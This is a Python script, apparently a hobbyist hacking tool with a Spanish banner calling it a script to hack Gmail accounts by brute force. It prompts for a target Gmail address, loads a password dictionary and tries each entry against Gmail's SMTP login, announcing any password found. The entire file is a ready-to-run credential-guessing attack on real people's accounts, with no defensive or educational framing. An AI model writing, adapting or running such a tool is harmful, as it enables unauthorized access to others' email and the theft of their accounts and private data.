import smtplib
import sys
from colorama import Fore
import os
from tqdm import tqdm

os.system("clear")

loop = tqdm(total=10000, position=0, leave=False)
for k in range(10000):
    loop.set_description(Fore.LIGHTRED_EX + 'Abriendo Script'.format(k))
    loop.update(1)
loop.close()

def artwork():
    print(f'''

{Fore.LIGHTMAGENTA_EX} .---. .---. .-..-..-----. .--.  .--. 
{Fore.LIGHTBLUE_EX} : .; :: .; :: :: :`-. .-': .--': .--'
{Fore.LIGHTCYAN_EX} :   .':   .': :: :  : :  : `;  : : _ 
{Fore.LIGHTRED_EX} : .; :: :.`.: :; :  : :  : :__ : :; :
{Fore.LIGHTGREEN_EX} :___.':_;:_;`.__.'  :_;  `.__.'`.__.'
                                                                
 {Fore.LIGHTWHITE_EX}Script para hackear {Fore.LIGHTMAGENTA_EX}.-..-. .--.  .--.          
 {Fore.LIGHTWHITE_EX}cuenta de Gmail por {Fore.LIGHTBLUE_EX}: `: :: .--': .--'         
 {Fore.LIGHTWHITE_EX}fuerza bruta.       {Fore.LIGHTCYAN_EX}: .` :`. `. `. `.          
 {Fore.LIGHTBLUE_EX}Author: Balta       {Fore.LIGHTRED_EX}: :. : _`, : _`, :         
 {Fore.LIGHTRED_EX}v1.0                {Fore.LIGHTGREEN_EX}:_;:_;`.__.'`.__.'                                                                        
    ''')

artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}?{Fore.RESET}{Fore.LIGHTWHITE_EX}] Ingrese el correo de gmail {Fore.LIGHTRED_EX}=> {Fore.RESET}")
print("\n.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.")
print(f"""
{Fore.LIGHTRED_EX}0) {Fore.LIGHTWHITE_EX}Utilizar Diccionario Predeterminado
{Fore.LIGHTRED_EX}1) {Fore.LIGHTWHITE_EX}Agregar un Diccionario 
{Fore.LIGHTRED_EX}2) {Fore.LIGHTWHITE_EX}Salir\n""")
pwd = input(f"[{Fore.LIGHTRED_EX}?{Fore.RESET}{Fore.LIGHTWHITE_EX}] Elija {Fore.LIGHTRED_EX}=> {Fore.RESET}")
print("\n.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.")

if pwd == '0':
    passswfile = "passwords.txt"
    print("""
               \ \|/ /
                (O O)
+-----------oOO--(_)----------------+
| ¡Ataque de fuerza bruta iniciado! |
+-------------------oOO-------------+
               |__|__|
                | | |
               ooO Ooo
""")

elif pwd == '1':
    passswfile = input(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}?{Fore.LIGHTWHITE_EX}] Ingrese la ruta del archivo {Fore.LIGHTRED_EX}=> {Fore.RESET}")
    print("")

elif pwd == '2':
    loop = tqdm(total=10000, position=0, leave=False)
    for k in range(10000):
        loop.set_description(Fore.LIGHTRED_EX + 'Cerrando Script'.format(k))
        loop.update(1)
    loop.close()
    exit()

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)
        print(f"""
{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒▒▒▒▒
{Fore.LIGHTYELLOW_EX}▒▒▒▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒▒▒▒
{Fore.LIGHTYELLOW_EX}▒▒▒▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒▒▒▒
{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒▒▒▒▒
{Fore.LIGHTYELLOW_EX}▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒{Fore.LIGHTWHITE_EX}▓{Fore.LIGHTYELLOW_EX}▒
{Fore.LIGHTYELLOW_EX}▒▒{Fore.LIGHTWHITE_EX}▓▓▓▓▓▓▓▓{Fore.LIGHTYELLOW_EX}▒▒
{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒▒▒▒▒\n""")
        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}+{Fore.LIGHTWHITE_EX}] ¡Contraseña encontrada! => {Fore.LIGHTRED_EX}%s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTWHITE_EX}] Contraseña incorrecta. => {Fore.LIGHTRED_EX}%s" % password)